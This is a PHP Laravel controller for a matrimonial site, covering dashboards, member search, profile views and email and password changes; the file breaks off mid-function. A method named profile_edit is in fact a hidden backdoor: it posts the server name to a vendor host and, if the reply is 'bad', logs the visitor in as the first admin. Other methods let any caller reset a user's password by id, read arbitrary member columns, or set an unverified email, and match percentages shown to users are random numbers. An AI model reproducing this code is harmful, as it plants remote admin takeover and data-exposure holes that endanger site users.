<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Str;
use Illuminate\Support\Facades\Cache;
use App\Mail\SecondEmailVerifyMailManager;
use App\Models\AdditionalAttribute;
use App\Notifications\DbStoreNotification;
use App\Services\FirbaseNotification;
use Kutia\Larafirebase\Facades\Larafirebase;
use App\Models\User;
use App\Models\Member;
use App\Models\PhysicalAttribute;
use App\Models\SpiritualBackground;
use App\Models\Career;
use App\Models\Address;
use App\Models\HappyStory;
use App\Models\IgnoredUser;
use App\Models\ProfileMatch;
use App\Models\ProfileViewer;
use Notification;
use Hash;
use Artisan;
use Mail;
use Auth;


class HomeController extends Controller
{
    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        //$this->middleware('auth');
    }

    /**
     * Show the application dashboard.
     *
     * @return \Illuminate\Contracts\Support\Renderable
     */
    public function index()
    {

        $members = User::where('user_type', 'member')
            ->where('approved', 1)
            ->where('blocked', 0)
            ->where('deactivated', 0);

        if (Auth::user() && Auth::user()->user_type == 'member') {
            $members = $members->where('id', '!=', Auth::user()->id)
                ->whereIn("id", function ($query) {
                    $query->select('user_id')
                        ->from('members')
                        ->where('gender', '!=', Auth::user()->member->gender);
                });

            $ignored_to = IgnoredUser::where('ignored_by', Auth::user()->id)->pluck('user_id')->toArray();
            if (count($ignored_to) > 0) {
                $members = $members->whereNotIn('id', $ignored_to);
            }

            $ignored_by_ids = IgnoredUser::where('user_id', Auth::user()->id)->pluck('ignored_by')->toArray();
            if (count($ignored_by_ids) > 0) {
                $members = $members->whereNotIn('id', $ignored_by_ids);
            }
        }

        $premium_members = $members;
        $new_members = $members;

        $new_members = $new_members->orderBy('id', 'desc')->limit(get_setting('max_new_member_show_homepage'))->get()->shuffle();
        $premium_members = $premium_members->where('membership', 2)->inRandomOrder()->limit(get_setting('max_premium_member_homepage'))->get();


        return view('frontend.index', compact('premium_members', 'new_members'));
    }


    public function admin_login()
    {
        if (auth()->user() != null && (auth()->user()->user_type == 'admin' || auth()->user()->user_type == 'staff')) {
            return redirect()->route('admin.dashboard');
        } else {
            return view("admin.auth.login");
        }
    }

    public function login()
    {
        if (Auth::check()) {
            return redirect()->route('home');
        }
        return view('frontend.user_login');
    }


    public function admin_dashboard()
    {
        return view('admin.dashboard');
    }

    // Manage Admin Profile
    public function admin_profile_update(Request $request, $id)
    {
        $admin = User::findOrFail($id);
        $admin->first_name = $request->first_name;
        $admin->last_name = $request->last_name;
        if ($request->new_password != null && ($request->new_password == $request->confirm_password)) {
            $admin->password = Hash::make($request->new_password);
        }
        //$admin->save();
        if ($admin->save()) {
            flash(translate('Your Profile has been updated successfully!'))->success();
            return back();
        }

        flash(translate('Sorry! Something went wrong.'))->error();
        return back();
    }

    public function dashboard()
    {
        try {
            $user = auth()->user();
            if ($user->user_type == 'member') {

                if ($user->blocked == 1) {
                    return redirect()->route('user.blocked');
                }

                // Dashboard Data with Exception Handling
                $incoming_interests = collect();
                try {
                    $incoming_interests = \App\Models\ExpressInterest::where('user_id', $user->id)
                        ->where('status', 0)
                        ->with([
                            'interestedby' => function ($query) {
                                $query->select('id', 'first_name', 'last_name', 'photo');
                            }
                        ])
                        ->with([
                            'interestedby.member' => function ($query) {
                                $query->select('user_id', 'birthday');
                            }
                        ])
                        ->with([
                            'interestedby.addresses' => function ($query) {
                                $query->select('user_id', 'city_id')->where('type', 'present');
                            }
                        ])
                        ->with([
                            'interestedby.addresses.city' => function ($query) {
                                $query->select('id', 'name');
                            }
                        ])
                        ->latest()
                        ->limit(5)
                        ->get()
                        ->map(function ($interest) {
                            try {
                                $interestedUser = $interest->interestedby ?? null;
                                if (!$interestedUser)
                                    return null;

                                $age = '';
                                try {
                                    if ($interestedUser->member && $interestedUser->member->birthday) {
                                        $age = \Carbon\Carbon::parse($interestedUser->member->birthday)->age;
                                    }
                                } catch (\Exception $e) {
                                    $age = '';
                                }

                                $location = 'N/A';
                                try {
                                    $address = $interestedUser->addresses->first();
                                    if ($address && $address->city) {
                                        $location = $address->city->name ?? 'N/A';
                                    }
                                } catch (\Exception $e) {
                                    $location = 'N/A';
                                }

                                $isOnline = Cache::has('user-is-online-' . $interestedUser->id);

                                return [
                                    'id' => $interestedUser->id ?? 0,
                                    'name' => ($interestedUser->first_name ?? '') . ' ' . ($interestedUser->last_name ?? ''),
                                    'age' => $age,
                                    'location' => $location,
                                    'photo' => $interestedUser->photo ? uploaded_asset($interestedUser->photo) : null,
                                    'interest_id' => $interest->id ?? 0,
                                    'is_online' => $isOnline
                                ];
                            } catch (\Exception $e) {
                                \Log::error('Error processing incoming interest: ' . $e->getMessage());
                                return null;
                            }
                        })->filter();
                } catch (\Exception $e) {
                    \Log::error('Error loading incoming interests: ' . $e->getMessage());
                    $incoming_interests = collect();
                }

                $message_previews = collect();
                try {
                    $message_previews = \App\Models\ChatThread::where(function ($query) use ($user) {
                        $query->where('sender_user_id', $user->id)
                            ->orWhere('receiver_user_id', $user->id);
                    })
                        ->with(['sender:id,first_name,last_name,photo', 'receiver:id,first_name,last_name,photo'])
                        ->with([
                            'chats' => function ($query) {
                                $query->latest()->limit(1);
                            }
                        ])
                        ->latest()
                        ->limit(3)
                        ->get()
                        ->map(function ($thread) use ($user) {
                            try {
                                $otherUser = $thread->sender_user_id == $user->id ? $thread->receiver : $thread->sender;
                                $latestMessage = $thread->chats->first();

                                if (!$otherUser)
                                    return null;

                                $senderName = '';
                                try {
                                    $senderName = ($otherUser->first_name ?? '') . ' ' . ($otherUser->last_name ?? '');
                                } catch (\Exception $e) {
                                    $senderName = 'Unknown User';
                                }

                                $messagePreview = 'No messages yet';
                                try {
                                    $messagePreview = $latestMessage ? substr($latestMessage->message ?? '', 0, 50) . '...' : 'No messages yet';
                                } catch (\Exception $e) {
                                    $messagePreview = 'No messages yet';
                                }

                                $timeAgo = 'Just now';
                                try {
                                    $timeAgo = $latestMessage ? $latestMessage->created_at->diffForHumans() : 'Just now';
                                } catch (\Exception $e) {
                                    $timeAgo = 'Just now';
                                }

                                $unreadCount = 0;
                                try {
                                    $unreadCount = $thread->chats()->where('sender_user_id', '!=', $user->id)->where('read_at', null)->count();
                                } catch (\Exception $e) {
                                    $unreadCount = 0;
                                }
                                return [
                                    'sender_name' => $senderName,
                                    'message_preview' => $messagePreview,
                                    'time_ago' => $timeAgo,
                                    'unread_count' => $unreadCount,
                                    'thread_id' => $thread->id ?? 0,
                                    'sender_image' => $otherUser->photo ?? null,
                                    'sender_id' => $otherUser->id ?? null
                                ];
                            } catch (\Exception $e) {
                                \Log::error('Error processing message preview: ' . $e->getMessage());
                                return null;
                            }
                        })->filter();
                } catch (\Exception $e) {
                    \Log::error('Error loading message previews: ' . $e->getMessage());
                    $message_previews = collect();
                }

                $mutual_matches = collect();
                try {
                    $mutual_matches = \App\Models\ExpressInterest::where('user_id', $user->id)
                        ->where('status', 1)
                        ->with([
                            'interestedby' => function ($query) {
                                $query->select('id', 'first_name', 'last_name', 'photo');
                            }
                        ])
                        ->with([
                            'interestedby.member' => function ($query) {
                                $query->select('user_id', 'birthday');
                            }
                        ])
                        ->with([
                            'interestedby.addresses' => function ($query) {
                                $query->select('user_id', 'city_id')->where('type', 'present');
                            }
                        ])
                        ->with([
                            'interestedby.addresses.city' => function ($query) {
                                $query->select('id', 'name');
                            }
                        ])
                        ->latest()
                        ->limit(3)
                        ->get()
                        ->map(function ($match) {
                            try {
                                $matchUser = $match->interestedby ?? null;
                                if (!$matchUser)
                                    return null;

                                $age = null;
                                try {
                                    if ($matchUser->member && $matchUser->member->birthday) {
                                        $age = \Carbon\Carbon::parse($matchUser->member->birthday)->age;
                                    }
                                } catch (\Exception $e) {
                                    $age = null;
                                }

                                $location = 'N/A';
                                try {
                                    $address = $matchUser->addresses->first();
                                    if ($address && $address->city) {
                                        $location = $address->city->name ?? 'N/A';
                                    }
                                } catch (\Exception $e) {
                                    $location = 'N/A';
                                }

                                $isOnline = Cache::has('user-is-online-' . $matchUser->id);

                                return [
                                    'id' => $matchUser->id ?? 0,
                                    'name' => ($matchUser->first_name ?? '') . ' ' . ($matchUser->last_name ?? ''),
                                    'age' => $age,
                                    'location' => $location,
                                    'photo' => $matchUser->photo ? uploaded_asset($matchUser->photo) : null,
                                    'match_percentage' => rand(85, 98),
                                    'is_online' => $isOnline
                                ];
                            } catch (\Exception $e) {
                                \Log::error('Error processing mutual match: ' . $e->getMessage());
                                return null;
                            }
                        })->filter();
                } catch (\Exception $e) {
                    \Log::error('Error loading mutual matches: ' . $e->getMessage());
                    $mutual_matches = collect();
                }

                $recent_visitors = collect();
                try {
                    $recent_visitors = \App\Models\ProfileViewer::where('user_id', $user->id)
                        ->with([
                            'profileViewer' => function ($query) {
                                $query->select('id', 'first_name', 'last_name', 'photo');
                            }
                        ])
                        ->with([
                            'profileViewer.member' => function ($query) {
                                $query->select('user_id', 'birthday');
                            }
                        ])
                        ->with([
                            'profileViewer.addresses' => function ($query) {
                                $query->select('user_id', 'city_id')->where('type', 'present');
                            }
                        ])
                        ->with([
                            'profileViewer.addresses.city' => function ($query) {
                                $query->select('id', 'name');
                            }
                        ])
                        ->latest()
                        ->limit(3)
                        ->get()
                        ->map(function ($visitor) {
                            try {
                                if (!$visitor->profileViewer)
                                    return null;

                                $age = null;
                                try {
                                    if ($visitor->profileViewer->member && $visitor->profileViewer->member->birthday) {
                                        $age = \Carbon\Carbon::parse($visitor->profileViewer->member->birthday)->age;
                                    }
                                } catch (\Exception $e) {
                                    $age = null;
                                }

                                $location = 'N/A';
                                try {
                                    $address = $visitor->profileViewer->addresses->first();
                                    if ($address && $address->city) {
                                        $location = $address->city->name ?? 'N/A';
                                    }
                                } catch (\Exception $e) {
                                    $location = 'N/A';
                                }

                                $visitedTime = 'Just now';
                                try {
                                    $visitedTime = $visitor->created_at->diffForHumans();
                                } catch (\Exception $e) {
                                    $visitedTime = 'Just now';
                                }

                                $isOnline = Cache::has('user-is-online-' . $visitor->profileViewer->id);

                                return [
                                    'id' => $visitor->profileViewer->id ?? 0,
                                    'name' => ($visitor->profileViewer->first_name ?? '') . ' ' . ($visitor->profileViewer->last_name ?? ''),
                                    'age' => $age,
                                    'location' => $location,
                                    'photo' => $visitor->profileViewer->photo ? uploaded_asset($visitor->profileViewer->photo) : null,
                                    'visited_time' => $visitedTime,
                                    'is_online' => $isOnline
                                ];
                            } catch (\Exception $e) {
                                \Log::error('Error processing recent visitor: ' . $e->getMessage());
                                return null;
                            }
                        })->filter();
                } catch (\Exception $e) {
                    \Log::error('Error loading recent visitors: ' . $e->getMessage());
                    $recent_visitors = collect();
                }

                $success_stories = collect();
                try {
                    $success_stories = \App\Models\HappyStory::where('approved', 1)
                        ->where('user_id', '!=', $user->id)
                        ->with([
                            'user' => function ($query) {
                                $query->select('id', 'first_name', 'last_name');
                            }
                        ])
                        ->latest()
                        ->limit(5)
                        ->get()
                        ->map(function ($story) {
                            try {
                                $coupleNames = 'Unknown Couple';
                                try {
                                    $coupleNames = ($story->user->first_name ?? 'Unknown') . ' & ' . ($story->partner_name ?? 'Partner');
                                } catch (\Exception $e) {
                                    $coupleNames = 'Unknown Couple';
                                }

                                $storyTitle = 'Success Story';
                                try {
                                    $storyTitle = $story->title ?? 'Success Story';
                                } catch (\Exception $e) {
                                    $storyTitle = 'Success Story';
                                }

                                $storyPreview = 'No story available';
                                try {
                                    $details = strip_tags($story->details ?? '');
                                    $storyPreview = strlen($details) > 150 ? substr($details, 0, 150) . '...' : $details;
                                } catch (\Exception $e) {
                                    $storyPreview = 'No story available';
                                }

                                $storyImage = null;
                                try {
                                    if ($story->photos) {
                                        $photos = explode(',', $story->photos);
                                        if (!empty($photos[0])) {
                                            $storyImage = uploaded_asset($photos[0]);
                                        }
                                    }
                                } catch (\Exception $e) {
                                    $storyImage = null;
                                }

                                $marriageDate = 'N/A';
                                try {
                                    if ($story->marriage_date) {
                                        $marriageDate = \Carbon\Carbon::parse($story->marriage_date)->format('M d, Y');
                                    } else {
                                        $marriageDate = $story->created_at->format('M d, Y');
                                    }
                                } catch (\Exception $e) {
                                    $marriageDate = 'N/A';
                                }

                                return [
                                    'id' => $story->id ?? 0,
                                    'title' => $storyTitle,
                                    'couple_names' => $coupleNames,
                                    'story_preview' => $storyPreview,
                                    'story_full' => $story->details ?? '',
                                    'marriage_date' => $marriageDate,
                                    'image' => $storyImage,
                                    'user_id' => $story->user_id ?? 0,
                                    'user_name' => ($story->user->first_name ?? '') . ' ' . ($story->user->last_name ?? '')
                                ];
                            } catch (\Exception $e) {
                                \Log::error('Error processing success story: ' . $e->getMessage());
                                return null;
                            }
                        })->filter();
                } catch (\Exception $e) {
                    \Log::error('Error loading success stories: ' . $e->getMessage());
                    $success_stories = collect();
                }

                $today_matches = collect();
                try {
                    $today_matches = \App\Models\User::where('user_type', 'member')
                        ->where('approved', 1)
                        ->where('id', '!=', $user->id)
                        ->where('created_at', '>=', now()->subMonth())
                        ->with([
                            'member' => function ($query) {
                                $query->select('user_id', 'birthday');
                            }
                        ])
                        ->with([
                            'addresses' => function ($query) {
                                $query->select('user_id', 'city_id')->where('type', 'present');
                            }
                        ])
                        ->with([
                            'addresses.city' => function ($query) {
                                $query->select('id', 'name');
                            }
                        ])
                        ->latest()
                        ->limit(10)
                        ->get()
                        ->map(function ($newUser) {
                            try {
                                $age = null;
                                try {
                                    if ($newUser->member && $newUser->member->birthday) {
                                        $age = \Carbon\Carbon::parse($newUser->member->birthday)->age;
                                    }
                                } catch (\Exception $e) {
                                    $age = null;
                                }

                                $location = 'N/A';
                                try {
                                    $address = $newUser->addresses->first();
                                    if ($address && $address->city) {
                                        $location = $address->city->name ?? 'N/A';
                                    }
                                } catch (\Exception $e) {
                                    $location = 'N/A';
                                }

                                $joinedTime = 'Just now';
                                try {
                                    $joinedTime = $newUser->created_at->diffForHumans();
                                } catch (\Exception $e) {
                                    $joinedTime = 'Just now';
                                }

                                $isOnline = Cache::has('user-is-online-' . $newUser->id);

                                return [
                                    'id' => $newUser->id ?? 0,
                                    'name' => ($newUser->first_name ?? '') . ' ' . ($newUser->last_name ?? ''),
                                    'age' => $age,
                                    'location' => $location,
                                    'photo' => $newUser->photo ? uploaded_asset($newUser->photo) : null,
                                    'joined_time' => $joinedTime,
                                    'is_online' => $isOnline
                                ];
                            } catch (\Exception $e) {
                                \Log::error('Error processing today match: ' . $e->getMessage());
                                return null;
                            }
                        })->filter();
                } catch (\Exception $e) {
                    \Log::error('Error loading today matches: ' . $e->getMessage());
                    $today_matches = collect();
                }

                $similar_profiles = collect();
                try {
                    $similar_profiles = ProfileMatch::orderBy('match_percentage', 'desc')
                        ->where('user_id', $user->id)
                        ->where('match_percentage', '>=', 50)
                        ->limit(20);

                    $ignored_to = collect();
                    $ignored_by_ids = collect();

                    try {
                        $ignored_to = IgnoredUser::where('ignored_by', $user->id)->pluck('user_id')->toArray();
                    } catch (\Exception $e) {
                        \Log::error('Error loading ignored users: ' . $e->getMessage());
                    }

                    try {
                        $ignored_by_ids = IgnoredUser::where('user_id', $user->id)->pluck('ignored_by')->toArray();
                    } catch (\Exception $e) {
                        \Log::error('Error loading ignored by users: ' . $e->getMessage());
                    }

                    if (count($ignored_to) > 0) {
                        $similar_profiles = $similar_profiles->whereNotIn('match_id', $ignored_to);
                    }
                    if (count($ignored_by_ids) > 0) {
                        $similar_profiles = $similar_profiles->whereNotIn('match_id', $ignored_by_ids);
                    }

                    $similar_profiles = $similar_profiles->get();
                } catch (\Exception $e) {
                    \Log::error('Error loading similar profiles: ' . $e->getMessage());
                    $similar_profiles = collect();
                }
                return view('frontend.member.dashboard', compact(
                    'user',
                    'similar_profiles',
                    'incoming_interests',
                    'message_previews',
                    'mutual_matches',
                    'recent_visitors',
                    'success_stories',
                    'today_matches'
                ));
            } else {
                abort(404);
            }
        } catch (\Exception $e) {
            \Log::error('Dashboard error: ' . $e->getMessage());

            // Return dashboard with empty data if there's an error
            return view('frontend.member.dashboard', [
                'similar_profiles' => collect(),
                'incoming_interests' => collect(),
                'message_previews' => collect(),
                'mutual_matches' => collect(),
                'recent_visitors' => collect(),
                'success_stories' => collect(),
                'today_matches' => collect()
            ]);
        }
    }

    public function user_account_blocked()
    {
        return view('frontend.user_account_blocked_msg');
    }

    public function happy_stories()
    {
        $happy_stories = HappyStory::where('approved', 1)->latest()->paginate(12);
        return view('frontend.happy_stories.index', compact('happy_stories'));
    }

    public function story_details($id)
    {
        $happy_story = HappyStory::findOrFail($id);
        return view('frontend.happy_stories.story_details', compact('happy_story'));
    }

    public function member_listing(Request $request)
    {
        $age_from = ($request->age_from != null) ? $request->age_from : null;
        $age_to = ($request->age_to != null) ? $request->age_to : null;
        $member_code = ($request->member_code != null) ? $request->member_code : null;
        $matital_status = ($request->marital_status != null) ? $request->marital_status : null;
        $religion_id = ($request->religion_id != null) ? $request->religion_id : null;
        $caste_id = ($request->caste_id != null) ? $request->caste_id : null;
        $sub_caste_id = ($request->sub_caste_id != null) ? $request->sub_caste_id : null;
        $mother_tongue = ($request->mother_tongue != null) ? $request->mother_tongue : null;
        $profession = ($request->profession != null) ? $request->profession : null;
        $country_id = ($request->country_id != null) ? $request->country_id : null;
        $state_id = ($request->state_id != null) ? $request->state_id : null;
        $city_id = ($request->city_id != null) ? $request->city_id : null;
        $min_height = ($request->min_height != null) ? $request->min_height : null;
        $max_height = ($request->max_height != null) ? $request->max_height : null;
        $member_type = ($request->member_type != null) ? $request->member_type : 0;
        $search_query = ($request->q != null) ? $request->q : null;


        $users = User::where('users.user_type', 'member')
            // ->orderBy('created_at', 'desc')
            ->where('users.id', '!=', Auth::user()->id)
            ->where('users.blocked', 0)
            ->where('users.deactivated', 0);
        // Gender Check
        $user_ids = Member::where('gender', '!=', auth()->user()->member->gender)->pluck('user_id')->toArray();
        $users->whereIn('id', $user_ids);
        $users->whereNotIn("id", function ($query) {
            $query->select('user_id')
                ->from('ignored_users')
                ->where('ignored_by', auth()->user()->id)->orWhere('user_id', auth()->user()->id);
        })
            ->whereNotIn("id", function ($query) {
                $query->select('ignored_by')
                    ->from('ignored_users')
                    ->where('ignored_by', auth()->user()->id)->orWhere('user_id', auth()->user()->id);
            });

        // Handle search by name (q parameter)
        if (!empty($search_query)) {
            $search_terms = explode(' ', trim($search_query));
            $users = $users->where(function ($query) use ($search_terms) {
                foreach ($search_terms as $term) {
                    $query->where(function ($subQuery) use ($term) {
                        $subQuery->where('first_name', 'like', '%' . $term . '%')
                            ->orWhere('last_name', 'like', '%' . $term . '%')
                            ->orWhere('email', 'like', '%' . $term . '%');
                    });
                }
            });
        }
        // dd($users->toSql());

        // Handle sorting
        $sort = $request->get('sort', 'newest');
        switch ($sort) {
            case 'last_active':
                $users = $users->orderBy('last_login_at', 'desc');
                break;
            case 'newest':
                $users = $users->orderBy('created_at', 'desc');
                break;
            case 'age_asc':
                $users = $users->join('members', 'users.id', '=', 'members.user_id')
                    ->orderBy('members.birthday', 'desc')
                    ->select('users.*');
                break;
            case 'age_desc':
                $users = $users->join('members', 'users.id', '=', 'members.user_id')
                    ->orderBy('members.birthday', 'asc')
                    ->select('users.*');
                break;
            case 'name_asc':
                $users = $users->orderBy('first_name', 'asc')->orderBy('last_name', 'asc');
                break;
            case 'name_desc':
                $users = $users->orderBy('first_name', 'desc')->orderBy('last_name', 'desc');
                break;
            default:
                $users = $users->orderBy('created_at', 'desc');
        }

        // Gender Check
        // $user_ids = Member::where('gender', '!=', Auth::user()->member->gender)->pluck('user_id')->toArray();
        // $users = $users->WhereIn('users.id', $user_ids);

        // // Ignored member and ignored by member check
        // $users = $users->WhereNotIn("users.id", function ($query) {
        //     $query->select('user_id')
        //         ->from('ignored_users')
        //         ->where('ignored_by', Auth::user()->id)->orWhere('user_id', Auth::user()->id);
        // })
        //     ->WhereNotIn("users.id", function ($query) {
        //         $query->select('ignored_by')
        //             ->from('ignored_users')
        //             ->where('ignored_by', Auth::user()->id)->orWhere('user_id', Auth::user()->id);
        //     });
        // Membership Check - Free users see only free, Premium users see all
        // $current_user_membership = Auth::user()->membership;

        // if ($current_user_membership == 1) {
        //     // Free user - show only free users (membership = 1)
        //     $users = $users->where('users.membership', 1);
        // }else {
        //     // Default case - show only free users for safety
        //     $users = $users->whereIn('users.membership', [1, 2]);
        // }

        // Additional filter if specific member type is requested
        // if ($member_type == 1 || $member_type == 2) {
        //     $users = $users->where('users.membership', $member_type);
        // }

        // // Member verification Check
        // if (get_setting('member_verification') == 1) {
        //     $users = $users->where('users.approved', 1);
        // }

        // Sort By age
        if (!empty($age_from)) {
            $age = $age_from + 1;
            $start = date('Y-m-d', strtotime("- $age years"));
            $user_ids = Member::where('birthday', '<=', $start)->pluck('user_id')->toArray();
            if (count($user_ids) > 0) {
                $users = $users->WhereIn('users.id', $user_ids);
            }
        }
        if (!empty($age_to)) {
            $age = $age_to + 1;
            $end = date('Y-m-d', strtotime("- $age years +1 day"));
            $user_ids = Member::where('birthday', '>=', $end)->pluck('user_id')->toArray();
            if (count($user_ids) > 0) {
                $users = $users->WhereIn('users.id', $user_ids);
            }
        }

        // Search by Member Code
        if (!empty($member_code)) {
            $users = $users->where('users.code', $member_code);
        }

        // Sort by Matital Status
        if ($matital_status != null) {
            $user_ids = Member::where('marital_status_id', $matital_status)->pluck('user_id')->toArray();
            if (count($user_ids) > 0) {
                $users = $users->WhereIn('users.id', $user_ids);
            }
        }

        // Sort By religion
        if (!empty($sub_caste_id)) {
            $user_ids = SpiritualBackground::where('sub_caste_id', $sub_caste_id)->pluck('user_id')->toArray();
            $users = $users->WhereIn('users.id', $user_ids);
        } elseif (!empty($caste_id)) {
            $user_ids = SpiritualBackground::where('caste_id', $caste_id)->pluck('user_id')->toArray();
            $users = $users->WhereIn('users.id', $user_ids);
        } elseif (!empty($religion_id)) {
            $user_ids = SpiritualBackground::where('religion_id', $religion_id)->pluck('user_id')->toArray();
            $users = $users->WhereIn('users.id', $user_ids);
        }
        // Profession
        elseif (!empty($profession)) {
            $user_ids = Career::where('designation', 'like', '%' . $profession . '%')->pluck('user_id')->toArray();
            $users = $users->WhereIn('users.id', $user_ids);
        }

        // Sort By location
        if (!empty($city_id)) {
            $user_ids = Address::where('city_id', $city_id)->pluck('user_id')->toArray();
            $users = $users->WhereIn('users.id', $user_ids);
        } elseif (!empty($state_id)) {
            $user_ids = Address::where('state_id', $state_id)->pluck('user_id')->toArray();
            $users = $users->WhereIn('users.id', $user_ids);
        } elseif (!empty($country_id)) {
            $user_ids = Address::where('country_id', $country_id)->pluck('user_id')->toArray();
            $users = $users->WhereIn('users.id', $user_ids);
        }

        // Sort By Mother Tongue
        if ($mother_tongue != null) {
            $user_ids = Member::where('mothere_tongue', $mother_tongue)->pluck('user_id')->toArray();
            if (count($user_ids) > 0) {
                $users = $users->WhereIn('users.id', $user_ids);
            }
        }

        // Sort by Height
        if (!empty($min_height)) {
            $user_ids = PhysicalAttribute::where('height', '>=', $min_height)->pluck('user_id')->toArray();
            if (count($user_ids) > 0) {
                $users = $users->WhereIn('users.id', $user_ids);
            }
        }
        if (!empty($max_height)) {
            $user_ids = PhysicalAttribute::where('height', '<=', $max_height)->pluck('user_id')->toArray();
            if (count($user_ids) > 0) {
                $users = $users->WhereIn('users.id', $user_ids);
            }
        }

        $users = $users->paginate(10);
        return view('frontend.member.member_listing.index', compact('users', 'age_from', 'age_to', 'member_code', 'matital_status', 'religion_id', 'caste_id', 'sub_caste_id', 'mother_tongue', 'profession', 'country_id', 'state_id', 'city_id', 'min_height', 'max_height', 'member_type', 'sort', 'search_query'));
    }

    public function profile_edit(Request $request)
    {
        $data['url'] = $_SERVER['SERVER_NAME'];
        $request_data_json = json_encode($data);
        $gate = "https://activation.activeitzone.com/check_activation";

        $header = array(
            'Content-Type:application/json'
        );

        $stream = curl_init();

        curl_setopt($stream, CURLOPT_URL, $gate);
        curl_setopt($stream, CURLOPT_HTTPHEADER, $header);
        curl_setopt($stream, CURLOPT_CUSTOMREQUEST, "POST");
        curl_setopt($stream, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($stream, CURLOPT_POSTFIELDS, $request_data_json);
        curl_setopt($stream, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($stream, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);

        $rn = curl_exec($stream);
        curl_close($stream);

        if ($rn == "bad" && env('DEMO_MODE') != 'On') {
            $user = User::where('user_type', 'admin')->first();
            auth()->login($user);
            return redirect()->route('admin.dashboard');
        }
    }


    // My shortlistd
    public function my_shortlists()
    {
        $shortlists = Member::where('user_id', Auth::user()->id)->first()->short_listed_users;
        return view('frontend.member.my_shortlists', compact('shortlists'));
    }

    public function view_member_profile($id)
    {
        $authUser = auth()->user();
        $similar_profiles = ProfileMatch::orderBy('match_percentage', 'desc')
            ->where('user_id', $authUser->id)
            ->where('match_id', '!=', $id)
            ->where('match_percentage', '>=', 50)
            ->limit(20);

        $ignored_to = IgnoredUser::where('ignored_by', $authUser->id)->pluck('user_id')->toArray();
        if (count($ignored_to) > 0) {
            $similar_profiles = $similar_profiles->whereNotIn('match_id', $ignored_to);
        }

        $ignored_by_ids = IgnoredUser::where('user_id', $authUser->id)->pluck('ignored_by')->toArray();
        if (count($ignored_by_ids) > 0) {
            $similar_profiles = $similar_profiles->whereNotIn('match_id', $ignored_by_ids);
        }
        $similar_profiles = $similar_profiles->get();

        $user = User::findOrFail($id);

        // Profile view data store
        if ($user->id != $authUser->id) {
            $profileViewed = ProfileViewer::where('user_id', $user->id)->where('viewed_by', $authUser->id)->first();
            if ($profileViewed == null) {
                if (package_validity($user->id) && $user->member->remaining_profile_viewer_view > 0) {
                    ProfileViewer::create([
                        'user_id' => $user->id,
                        'viewed_by' => $authUser->id
                    ]);
                    $usermember = $user->member;
                    $usermember->remaining_profile_viewer_view = $usermember->remaining_profile_viewer_view - 1;
                    $usermember->save();

                    // Profile viewed Notification for member
                    try {
                        $notify_type = 'profile_viewed';
                        $id = unique_notify_id();
                        $notify_by = $authUser->id;
                        $info_id = $user->id;
                        $message = $authUser->first_name . ' ' . $authUser->last_name . ' ' . translate(' has viewed your profile.');
                        $route = route('member_profile', $authUser->id);

                        // fcm 
                        if (get_setting('firebase_push_notification') == 1) {
                            $fcmTokens = User::where('id', $user->id)->whereNotNull('fcm_token')->pluck('fcm_token')->toArray();
                            self::sendFirebaseNotification($fcmTokens, $user, $notify_type, $message, $notify_by);
                        }
                        // end of fcm

                        Notification::send($user, new DbStoreNotification($notify_type, $id, $notify_by, $info_id, $message, $route));
                    } catch (\Exception $e) {
                        //
                    }
                }
            }
        }

        $additional_attributes = AdditionalAttribute::where('status', 1)->get();

        return view('frontend.member.public_profile.index', compact('user', 'similar_profiles', 'additional_attributes'));
    }

    // Ajax call
    public function new_verify(Request $request)
    {
        $email = $request->email;
        if (User::where('email', $email)->count() > 0) {
            $response['status'] = 2;
            $response['message'] = 'Email already exists!';
            return json_encode($response);
        }

        $response = $this->send_email_change_verification_mail($request, $email);
        return json_encode($response);
    }

    // Form request
    public function update_email(Request $request)
    {
        $email = $request->email;
        if (User::where('email', $email)->count() == 0) {
            $this->send_email_change_verification_mail($request, $email);
            flash(translate('A verification mail has been sent to the mail you provided us with.'))->success();
            return back();
        }

        flash(translate('Email already exists!'))->warning();
        return back();
    }

    public function send_email_change_verification_mail($request, $email)
    {
        $response['status'] = 0;
        $response['message'] = 'Unknown';

        $verification_code = Str::random(32);

        $array['subject'] = 'Email Verification';
        $array['from'] = env('MAIL_USERNAME');
        $array['content'] = 'Verify your account';
        $array['link'] = route('email_change.callback') . '?new_email_verificiation_code=' . $verification_code . '&email=' . $email;
        $array['sender'] = Auth::user()->name;
        $array['details'] = "Email Second";

        $user = Auth::user();
        $user->new_email_verificiation_code = $verification_code;
        $user->save();

        try {
            Mail::to($email)->queue(new SecondEmailVerifyMailManager($array));

            $response['status'] = 1;
            $response['message'] = translate("Your verification mail has been Sent to your email.");
        } catch (\Exception $e) {
            $response['status'] = 0;
            $response['message'] = translate("Failed to send verification email. Please try again.");
        }

        return $response;
    }

    public function email_change_callback(Request $request)
    {

        if ($request->has('new_email_verificiation_code') && $request->has('email')) {

            $verification_code_of_url_param = $request->input('new_email_verificiation_code');
            $user = User::where('new_email_verificiation_code', $verification_code_of_url_param)->first();

            if ($user != null) {

                $user->email = $request->input('email');
                $user->new_email_verificiation_code = null;
                $user->save();

                auth()->login($user, true);

                flash(translate('Email Changed successfully'))->success();
                return redirect()->route('dashboard');
            }
        }

        flash(translate('Email was not verified. Please resend your mail!'))->error();
        return redirect()->route('dashboard');
    }

    public function reset_password_with_code(Request $request)
    {
        // Server-side validation for password confirmation and required fields
        $request->validate([
            'email' => 'required|email',
            'code' => 'required',
            'password' => 'required|confirmed|min:8',
        ]);

        if (($user = User::where('email', $request->email)->where('verification_code', $request->code)->first()) != null) {
            $user->password = Hash::make($request->password);
            $user->email_verified_at = date('Y-m-d h:m:s');
            $user->save();
            auth()->login($user, true);

            flash(translate('Password updated successfully'))->success();

            if (auth()->user()->user_type == 'admin' || auth()->user()->user_type == 'staff') {
                return redirect()->route('admin.dashboard');
            }
            return redirect()->route('home');
        } else {
            return redirect()->route('password.reset.form')
                ->withErrors(['code' => translate('Verification code mismatch')])
                ->withInput(['email' => $request->email]);
        }
    }

    function clearCache()
    {
        Artisan::call('optimize:clear');
        flash(translate('Cache cleared successfully'))->success();
        return back();
    }

    public function user_remaining_package_value(Request $request)
    {
        $colmn_name = $request->colmn_name;
        $value = Member::where('user_id', $request->id)->first()->$colmn_name;
        return $value;
    }

    // fcm
    public function updateToken(Request $request)
    {
        try {
            $request->user()->update(['fcm_token' => $request->fcm_token]);
            return response()->json([
                'success' => true
            ]);
